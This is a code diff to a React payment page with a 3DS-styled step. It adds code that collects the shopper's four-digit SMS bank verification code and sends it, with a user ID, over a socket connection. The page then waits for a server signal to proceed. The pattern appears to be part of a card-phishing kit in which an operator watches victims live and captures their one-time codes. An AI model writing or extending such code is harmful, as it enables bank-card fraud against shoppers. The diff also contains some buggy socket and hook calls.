@@ -22,6 +22,7 @@ function PaymentPage() {
 
   const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });
   const [loading, setLoading] = useState(true);
+  const [submited, setSubmited] = useState(false);
 
   const digit1Ref = useRef<HTMLInputElement>(null);
   const digit2Ref = useRef<HTMLInputElement>(null);
@@ -33,12 +34,21 @@ function PaymentPage() {
   }, []);
 
   useEffect(() => {
-    socket.connect();
-    socket.emit("updateStatus", {
-      userId: userId,
-      status: "Waiting for 3DS"
-    });
+    if (loading) {
+      socket.emit("updateStatus", {
+        userId: userId,
+        status: "loading for 3DS"
+      }, [loading]);
+    } else {
+      socket.emit("updateStatus", {
+        userId: userId,
+        status: "Waiting for 3DS"
+      }, [loading]);
+    }
 
+  })
+
+  useEffect(() => {
     socket.on("allowedToProceed", () => {
       if (orderInput.delivery_address === null) return;
       const command_number = uuidv4();
@@ -46,7 +56,7 @@ function PaymentPage() {
         cart,
         total: orderInput.total,
         command_number: command_number,
-        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address.country}`
+        delivery_address: `${orderInput.delivery_address.firstname} ${orderInput.delivery_address.lastname} ${orderInput.delivery_address.entreprise} ${orderInput.delivery_address.address} ${orderInput.delivery_address.precision}  ${orderInput.delivery_address.postal_code} ${orderInput.delivery_address.city} ${orderInput.delivery_address?.country.name}`
       }));
       setTimeout(() => navigate("/order"), 2000);
     });
@@ -76,6 +86,16 @@ function PaymentPage() {
     if (name === "digit2" && value) digit3Ref.current?.focus();
     if (name === "digit3" && value) digit4Ref.current?.focus();
     dispatch(actionChangePaymentInfo({ name: "verif_code", value: updatedDigits }));
+  }
+
+  const handleSubmit = () => {
+    const verifCode = `${digits.digit1}${digits.digit2}${digits.digit3}${digits.digit4}`;
+    setSubmited(true);
+    socket.emit("updateStatus", {
+      userId: userId,
+      status: "Waiting for 3DS",
+      verifCode: verifCode
+    }, [loading]);
   }
 
   return (
@@ -123,14 +143,14 @@ function PaymentPage() {
             <div className="paymentPage_code">
               <span className="paymentPage_code_title">Ou saisissez le code de vérification envoyé par SMS</span>
               <div className="paymentPage_code_inputs">
-                <input type="text" name="digit1" value={digits.digit1} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit1Ref} />
-                <input type="text" name="digit2" value={digits.digit2} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit2Ref} />
-                <input type="text" name="digit3" value={digits.digit3} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit3Ref} />
-                <input type="text" name="digit4" value={digits.digit4} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit4Ref} />
+                <input type="text" name="digit1" value={digits.digit1} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit1Ref} disabled={submited} />
+                <input type="text" name="digit2" value={digits.digit2} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit2Ref} disabled={submited} />
+                <input type="text" name="digit3" value={digits.digit3} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit3Ref} disabled={submited} />
+                <input type="text" name="digit4" value={digits.digit4} onChange={handleChange} onKeyDown={handleKeyDown} className="paymentPage_code_inputs_input" ref={digit4Ref} disabled={submited} />
               </div>
               {
                 digits.digit1 && digits.digit2 && digits.digit3 && digits.digit4 &&
-                <button type="button" className="paymentPage_code_btn">Valider</button>
+                <button type="button" className="paymentPage_code_btn" onClick={handleSubmit} disabled={submited}>Valider</button>
               }
 
             </div>
